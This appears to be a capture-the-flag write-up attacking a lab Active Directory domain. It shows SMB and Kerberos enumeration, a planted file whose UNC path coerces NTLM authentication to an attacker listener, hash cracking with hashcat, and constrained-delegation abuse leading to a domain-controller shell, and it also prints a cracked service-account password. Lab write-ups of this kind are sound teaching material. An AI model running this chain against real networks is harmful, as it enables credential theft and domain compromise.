initial reconassance 

started using nmap to list services, ports and versions. 

nmap -Pn -sV -sC -oN 

all to stdout initial_scan_nmap-txt

53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows NetBIOS
389/tcp   open  ldap          Microsoft Active Directory LDAP
445/tcp   open  microsoft-ds  SMB
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft RPC over HTTP
636/tcp   open  ldaps
3268/tcp  open  ldap          Global Catalog
3269/tcp  open  ldaps         Global Catalog SSL
3389/tcp  open  ms-wbt-server RDP
9389/tcp  open  mc-nmf        .NET Message Framing

Domain: ctf.local
NetBIOS domain: CTF
Computer name: DC01
DNS name: DC01.ctf.local

i used smbclient and nxc smb to look into the shares, discover that "guest" user is accepted. 

SMB                      10.114.151.237  445    DC01             IPC$            READ                   Remote IPC
SMB                      10.114.151.237  445    DC01             IT-Shared       READ,WRITE             IT Department Shared Resources

this finds are interesting, since we have read rights, lets start by that. 

on it sharing we found 3 archives 

IT-Credentials-Backup.txt           A      406  Fri May 22 05:18:15 2026
IT-Onboarding-Checklist.txt         A      676  Fri May 22 05:18:16 2026
IT-Portal.html                      A     4887  Fri May 22 05:19:03 2026

Credntials backup provides us with two potential creds, event that says they are disable nothing garantee that they are in fact. 

Onboarding checklist gave us some more info. 

email = helpdesk@ctf.local

File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.

mention the existence of an intranet

Database Backup (svc.mssql)
    Handles nightly MSSQL backups. Member of Backup Operators.

the portal show us some more info 

Active Directory
DC01.ctf.local

DNS
DC01.ctf.local

File Share (IT-Shared)
DC01.ctf.local

Backup Agent
SRV01.ctf.local

Monitoring
SRV02.ctf.local

Printer offline – 2nd floor
Password reset – m.jones
Backup job failed on SRV01

we all that gather an fair amount of information about potential users, domain names and services. 

i decide to compile an list of potential usernames an ran kerbrute to validate them. 

2026/11/06 15:10:14 >  [+] VALID USERNAME:	 svc.scanner@ctf.local
2026/11/06 15:10:14 >  [+] VALID USERNAME:	 svc.mssql@ctf.local

with -rid-brute 

SMB         10.114.151.237  445    DC01             1111: CTF\svc.scanner (SidTypeUser)
SMB         10.114.151.237  445    DC01             1112: CTF\svc.mssql (SidTypeUser)

we validate that the two accountes are service accounts. 

since the onboarding file mentions that scanner runs every two minutes on it shared and use shell to read metadata
i wonder if is posible to use file based coercion here. 

i start by echo 'Get-ChildItem \\my_attackerbox_ip\icons\' > scan.ps1

that create an archive, that will abuse UNC Path forcing sytem to initiate an outbound SMB connection to my machine. 

since i have responder here i started an listener in tun0(my eth adapter) 
 sudo responder -I tun0 -dwv

access the IT-SHARE and put the archive 

await 

ban (put image above) 

we have an NetNTLMv2, important to notice only NTLM are hashes that we could use to pass-the-hash or overpass hash attacks. 

unfortunatily we need to crack or relay the NetNTLMv2, in our case we are going to crack it. 

so i put the hash ito in an txt file and im going to use hahcat to crack 

hashcat -m 5600 -a 0 hash_ntmlv2.txt worlists/rockyou.txt

SVC.SCANNER::CTF:82bec95d03985a40:3ae9c542ca76446af6267a875475fc30:01010000000000008015eaa3026edd01c63c71e66abfda95000000000200080054004d004600310001001e00570049004e002d004b005700390031005a00460033004c0052004c00360004003400570049004e002d004b005700390031005a00460033004c0052004c0036002e0054004d00460031002e004c004f00430041004c000300140054004d00460031002e004c004f00430041004c000500140054004d00460031002e004c004f00430041004c00070008008015eaa3026edd0106000400020000000800300030000000000000000100000000200000c92e72cb6c16f10ddbedfd75b195e61ca154e2724032d92d03843c8fb0ecb7f40a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100350033002e003200350033000000000000000000:REDACT!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVC.SCANNER::CTF:82bec95d03985a40:3ae9c542ca76446af...000000
Time.Started.....: Fri Nov  6 15:34:13 2026 (0 secs)
Time.Estimated...: Fri Nov  6 15:34:13 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)


in a few seconds password cracked. 

(more scans image)

after look a bit with the passwoer in hand we dont found much 

lets run bloodhound to see if we can find an path to escalate privs. 

bloodhound-python -u svc.scanner -p '1summerlove!' -d ctf.local -ns 10.114.151.237 -c All --zip

our object as impose is to get administrator privilages, bloodhound show us the exact path to take 

quering ldap 

LDAP        10.114.151.237  389    DC01             msDS-AllowedToDelegateTo cifs/DC01
LDAP        10.114.151.237  389    DC01                                  cifs/DC01.ctf.local

we confirm that we can impersonate users an acess all files on DC01 on their behalf 

the rest of the process is very straith foward 

first we use getST impersonating administrator to get an TGT 

then we export to KRB5CCNAME wich is the place were kerberos tickets resides on linux 

then we add to etc/hosts the name and ip of the DC 

NOTE: since kerberos use Server principal name to resolve DNS we need to do this so kerberos can resolve. 

then using psexec -k -no-pass dc01.ctf.local 

we land an shell on DC 

in the end we capture the flag. 
